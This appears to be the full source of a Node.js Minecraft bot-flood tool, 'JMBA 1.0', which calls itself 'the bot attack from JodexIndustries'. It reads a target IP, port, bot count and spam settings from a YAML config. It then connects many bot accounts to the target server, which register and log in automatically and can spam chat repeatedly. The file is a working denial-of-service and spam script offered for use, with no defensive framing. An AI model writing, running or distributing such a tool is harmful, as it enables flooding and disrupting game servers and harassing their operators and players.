const mineflayer = require('mineflayer');
const fs = require('fs');
const util = require('util');
const yaml = require('js-yaml');
const axios = require('axios');
const pause = require('node-pause');

if(!fs.existsSync("config.yaml")) {
  console.log("File config.yaml not found, downloading...");
  axios.get('http://jodexindustries.github.io/JMBA/config.yaml', {responseType: "stream"} )
      .then(response => {
        response.data.pipe(fs.createWriteStream("config.yaml"));
        console.log("config.yaml successfully downloaded");
        pause("Run the script again");
      })
      .catch(error => {
        console.log(error);
      });
} else if(fs.existsSync('config.yaml')) {
    botstart();
}
    function botstart() {
    let rawdata = fs.readFileSync('config.yaml', 'utf8');
    let data = yaml.load(rawdata);
        const readFile = (fileName) => util.promisify(fs.readFile)(fileName, 'utf8')
        const host = data["ip"];
        const port = data["port"];
        const version = data["version"];
        const password = data["password"];
        const interval = data["interval"];
        const timeout = data["timeout"];
        const chatspamdelay = data["chatspamdelay"];
        const chatspammessage = data["chatspammessage"];
        const chatspam = data["chatspam"];
        const login = data["login"];
        var logincheck = login;
        const botname = data["botname"];
        const botcount = data["botcount"];

        console.log('Thank you for using the bot attack from JodexIndustries');
        console.log('JMBA 1.0');
        console.log('\x1b[32m');
        console.log('Starting...', '\x1b[0m');

        let i = 0
        function next () {
            if (i < botcount) {
                i++
                setTimeout(() => {
                    createBot(botname + `${i}`)
                    console.log(botname + `${i}` + '\x1b[32m connected \x1b[0m')
                    next()
                }, interval)
            }
        }
        next()


        function createBot (name, ix) {
            return new Promise((resolve, reject) => {
                setTimeout(() => {
                    const bot = mineflayer.createBot({
                        username: name,
                        host: host,
                        port: port,
                        version: version
                    });
                    bot.on('spawn', () => resolve(bot));
                    bot.on('error', (err) => {
                        reject(err)
                    });
                    bot.on('login', function () {
                        if (logincheck) {
                            bot.chat('/register ' + password + ' ' + password);
                            bot.chat('/login ' + password);
                        }
                    });
                    bot.on("kicked", function () {
                        console.log(name + '\x1b[31m disconnected \x1b[0m')
                    });
                    bot.on('spawn', function () {
                        if (chatspam) {
                            bot.chatspam.start()
                        }
                    });
                    bot.chatspam = {}
                    let spammer
                    let spammed = false
                    bot.chatspam.start = () => {
                        if (spammer) return
                        spammer = setInterval(spam, chatspamdelay)
                    }
                    function spam() {
                        bot.chat(chatspammessage)
                        spammed = !spammed
                    }
                    setTimeout(() => reject(Error('Took too long to spawn.')), + timeout) // 5 sec
                }, interval * ix)
            })
        }
}
